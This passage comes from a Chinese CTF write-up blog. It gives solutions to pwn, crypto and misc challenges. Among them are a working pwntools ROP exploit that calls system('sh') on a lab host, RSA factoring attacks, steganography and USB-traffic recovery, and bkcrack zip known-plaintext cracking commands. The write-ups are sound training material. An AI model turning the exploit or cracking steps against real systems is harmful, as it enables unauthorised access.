title="BabyRop"></a>BabyRop</h3><p>有<code>system</code>函数和<code>/cin/sh</code>，简单ROP，缺少的<code>/bin/sh\x00</code>可以用<code>sh\x00</code>代替。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.42.14&#x27;</span>, <span class="number">11000</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./BabyRop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x0804c029</span></span><br><span class="line">system_addr = <span class="number">0x80490a0</span></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x28</span> + <span class="number">4</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(sh_addr)</span><br><span class="line">pause()</span><br><span class="line">sl(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RingRingRing"><a href="#RingRingRing" class="headerlink" title="RingRingRing"></a>RingRingRing</h3><blockquote><p>ring a ring a ring ring a ring a ring</p></blockquote><p>nc测试md5-PoW之后，需要输入100组a,b,c,d,e，使得 $a^4+b^4+c^4+d^4=e^2$，且都不能为0。</p><p>构造 $1^4+1^4+1^4+1^4=2^2$，再按倍数做乘积 $k^4+k^4+k^4+k^4=(2k^2)^2,k \in [1,100]$，得到100组用例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> bruteforce</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span>(<span class="params">prefix,s</span>):</span></span><br><span class="line"><span class="keyword">return</span> bruteforce(<span class="keyword">lambda</span> x:md5(x+prefix).hexdigest()[<span class="number">0</span>:<span class="number">5</span>]==s,string.ascii_letters+string.digits,length=<span class="number">4</span>,method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;192.168.42.14&#x27;</span>,<span class="number">2378</span>)</span><br><span class="line">prefix, s = parse(<span class="string">&quot;Please find a string that md5(str + &#123;&#125;)[0:5] == &#123;&#125;&quot;</span>,r.recvline())</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] Give me xxxxx: &#x27;</span>,brute_force(prefix,s))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] a: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] b: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] c: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] d: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] e: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>*i*i))</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="comment">#GWHT&#123;a_funny_equation&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Easy-Rsa"><a href="#Easy-Rsa" class="headerlink" title="Easy_Rsa"></a>Easy_Rsa</h3><blockquote><p>你了解RSA吗???</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">nbits, gamma</span>):</span></span><br><span class="line">    g = getPrime(<span class="built_in">int</span>(nbits * gamma))</span><br><span class="line">    alpha = <span class="number">0.5</span> - gamma</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">        p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">            q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            h = <span class="number">2</span> * g * a * b + a + b</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> isPrime(q) <span class="keyword">or</span> isPrime(h) <span class="keyword">or</span> gmpy2.gcd(a, b) != <span class="number">1</span>:</span><br><span class="line">                b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">                q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">nbits, gamma</span>):</span></span><br><span class="line">    p, q = gen_prime(nbits, gamma)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = getPrime(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">while</span> gmpy2.gcd(e, gmpy2.lcm(p-<span class="number">1</span>,q-<span class="number">1</span>)) != <span class="number">1</span>:</span><br><span class="line">        e = getPrime(<span class="number">16</span>)</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="keyword">return</span> n, e, c</span><br><span class="line"></span><br><span class="line">n, e, c = encrypt(<span class="number">1024</span>, <span class="number">0.48</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;n =&#x27;</span>, n</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;e =&#x27;</span>, e</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c =&#x27;</span>, c</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line"><span class="comment"># e = 58337</span></span><br><span class="line"><span class="comment"># c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br></pre></td></tr></table></figure></blockquote><p>共素数攻击（common prime RSA）。</p><p>给出 $N=pq,p-1=2ga,q-1=2gb,h=2gab+a+b$，有 $N-1=2gh$，</p><p>所以 $x^{N-1} \pmod p$ 至多有 $a$ 个值，用 $x \rightarrow x^{N-1}+3$ 代替 Pollard’s rho算法中迭代函数，能在 $\text{O}(\sqrt{a})=\text{O}(N^{\frac{1}{4}-\frac{\gamma}{2}})$ 下分解 $N$。</p><p>common prime RSA在 $g$ 过小时， $g$ 也能轻易通过分解 $N-1$ 来解出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rho</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(<span class="built_in">abs</span>(a - b), n)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; in &#123;&#125; circle&#x27;</span>.<span class="built_in">format</span>(j, i))</span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line">e = <span class="number">58337</span></span><br><span class="line">c = <span class="number">13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br><span class="line"></span><br><span class="line">p, q = rho(n)</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;SangFor&#123;0a8c2220-4c1b-32c8-e8c1-adf92ec7678b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Bigrsa"><a href="#Bigrsa" class="headerlink" title="Bigrsa"></a>Bigrsa</h3><blockquote><p>BigRSA！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c = <span class="built_in">pow</span>(c, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = %d&quot;</span> % c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>尝试发现 $\gcd(n_1,n_2)=p$，分别求出 $q_1=n_1/p,q_2=n_2/p$，再用常规解密方法两步求出 $m$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(n1,n2)</span><br><span class="line">q1 = n1 // p</span><br><span class="line">q2 = n2 // p</span><br><span class="line">d1 = gmpy2.invert(e, (p-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p-<span class="number">1</span>)*(q2-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(c, d2, n2)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d1, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;SangFor&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><blockquote><p>简简单单猜数字01-30 SangFor{md5(<strong>-</strong>-<strong>-</strong>…..)}（32位md5）</p></blockquote><p>12张图分别得到关键数字：28-08-30-07-04-20-02-17-23-01-12-19，md5得flag：SangFor{d93b7da38d89c19f481e710ef1b3558b}</p><p>​    </p><h3 id="Misc520"><a href="#Misc520" class="headerlink" title="Misc520"></a>Misc520</h3><blockquote><p>有一天，zip爱上了pcap，zip为了能与pcap创造更多机会，不断地将自己的能力表现出来。可是，LSBSteg却突然杀了出来，将pcap吞并于png中，不放出来。zip看到了png，多喝热水少做梦。zip异常的愤怒，不断地用自己的能力去报复png，不让png逃走。至今，zip仍未释怀。。。</p></blockquote><p>拿到520.zip压缩包，循环嵌套着520层zip和story文件，脚本解压出所有文件（每次解压将story文件重命名防覆盖）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">now = <span class="string">&quot;520.zip&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;~~&quot;</span>+now)</span><br><span class="line">    zfile = zipfile.ZipFile(now)</span><br><span class="line">    zfile.extractall(members=zfile.namelist())</span><br><span class="line">    zfile.close()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.remove(now)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    names = os.listdir()</span><br><span class="line">    os.rename(<span class="string">&#x27;story&#x27;</span>,<span class="string">&#x27;story&#x27;</span>+now.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(names)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        <span class="keyword">if</span> name.endswith(<span class="string">&#x27;.zip&#x27;</span>) <span class="keyword">and</span> name != now:</span><br><span class="line">            now=name</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;~~~~&#x27;</span>+now)</span><br></pre></td></tr></table></figure><p>解出最里层是一张flag.png图片，按大小排序目录下所有文件，发现story150内容与其他不同：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这都被你发现了？</span><br><span class="line">我这故事不错吧，嘻嘻嘻</span><br><span class="line">那就把flag给你吧</span><br><span class="line">oh，不，还有一半藏在了pcap的心里，快去找找吧</span><br><span class="line">左心房右心房，扑通扑通的心，咿呀咿呀的❤</span><br><span class="line">72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108,</span><br></pre></td></tr></table></figure><p>得到数字 <code>72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108,</code></p><p>根据提示，zsteg查看png图片存在lsb隐写，按bgr方式提取出一个zip加密压缩包，爆破得密码<code>12345</code>解出flag.pcap。</p><p>wireshark查看发现全为USB流量，tshark提取：</p><p><code>tshark -r flag.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><p>将鼠标数据还原鼠标移动轨迹：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a=f.readline().strip()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">8</span>:</span><br><span class="line">out=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">fi.write(out)</span><br><span class="line">fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">fi.close()</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">x -= <span class="number">256</span></span><br><span class="line"><span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">y -= <span class="number">256</span></span><br><span class="line">posx += x</span><br><span class="line">posy += y</span><br><span class="line">btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">    f.write(<span class="built_in">str</span>(posx))</span><br><span class="line">    f.write(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>(posy))</span><br><span class="line">    f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>最后gnuplot做图：</p><p><code>gnuplot&gt; plot &quot;xy.txt&quot;</code></p><p>得到后半部分数字：<code>130, 63, 111, 94, 51, 134, 119, 146</code></p><p>结合flag格式，推知为变异凯撒移位解密，解出：</p><p><code>[71, 87, 72, 84, 123, 87, 51, 108, 67, 111, 109, 51, 95, 116, 48, 95, 77, 33, 115, 99, 125]</code></p><p>即<code>GWHT&#123;W3lCom3_t0_M!sc&#125;</code>，按群提示换为<code>Sangfor&#123;W3lCom3_t0_M!sc&#125;</code>。</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、深信服科技股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。&lt;/p&gt;
&lt;p&gt;大赛以“网络安全为人民、网络安全靠人民”为主题，旨在</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow 吃瓜杯</title>
    <link href="https://lazzzaro.github.io/2021/08/16/match-CTFshow-%E5%90%83%E7%93%9C%E6%9D%AF/"/>
    <id>https://lazzzaro.github.io/2021/08/16/match-CTFshow-%E5%90%83%E7%93%9C%E6%9D%AF/</id>
    <published>2021-08-16T11:22:00.000Z</published>
    <updated>2021-08-16T12:32:10.014Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>比赛名称：ctfshow 吃瓜杯<br>题目范围：web pwn re misc crypto<br>题目难度：怎么简单怎么来<br>比赛奖励：ctfshow定制鼠标垫或萌妹手办<br>比赛时间：2021年8月14日(周六) 晚 7点7分<br>比赛时长：48小时<br>比赛地址：<a href="https://ctf.show/challenges">https://ctf.show/challenges</a></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Misc游戏签到"><a href="#Misc游戏签到" class="headerlink" title="Misc游戏签到"></a>Misc游戏签到</h3><blockquote><p>运气与<del>策略</del>运气的游戏。值得注意的是，第一局出现必输的情况是正常的，并且概率较低，这能表明您在七夕这个节日真的非常欧，这边建议去抽卡。<del>所以说本题没有策略，只有运气。</del></p><p>地址： 移步去备用题,flag就在这交</p></blockquote><p>运气游戏，写个循环脚本跑出分段flag。</p><p>​    </p><h3 id="Dinner-of-Cyanogen"><a href="#Dinner-of-Cyanogen" class="headerlink" title="Dinner of Cyanogen"></a>Dinner of Cyanogen</h3><p>给了两个docx，一个未加密，另一个加密。</p><p>在未加密docx得到flag第一段；</p><p>发现其中的 <code>[Content_Types].xml</code> 大小相同，上明文攻击：</p><p><code>rbkcrack.exe -C AnotherLetter.zip -c &quot;[Content_Types].xml&quot; -p &quot;[Content_Types].xml&quot;</code></p><p>得到3-key，再用7z工具解压：</p><p><code>7za x AnotherLetter.zip &#39;-p[3b982977_2706fd64_6d6a5135]&#39; -oout</code></p><p>在 <code>flag.xml</code> 得到flag第二段；</p><p>在 <code>word.xml</code> 分别用0/1代替Wingdings两种字体，转字符串得到flag第三段。</p><p>​    </p><h3 id="xl的本质"><a href="#xl的本质" class="headerlink" title="xl的本质"></a>xl的本质</h3><p>Excel 2007（.xlsx）文件本质是压缩包。</p><p>新建一个excel，插入绘图，保存退出。</p><p>替换其中 xl/drawing 目录下的 drawing.xml 为题目给的xml文件，再打开xlsx文件看到flag图片。</p><p>​    </p><h3 id="吃瓜"><a href="#吃瓜" class="headerlink" title="吃瓜"></a>吃瓜</h3><p>jpg改为zip解压，文件为base64图片，浏览器打开得到二维码，扫码得栅栏密码，枚举栏数（栏数=2）解密得flag。</p><p>​    </p><h3 id="魔王"><a href="#魔王" class="headerlink" title="魔王"></a>魔王</h3><blockquote><p><strong>需要自己包上ctfshow{}</strong></p><p>题目有很多误导，小心点哦</p></blockquote><p>w3x为魔兽争霸地图文件，直接找到地图查看工具 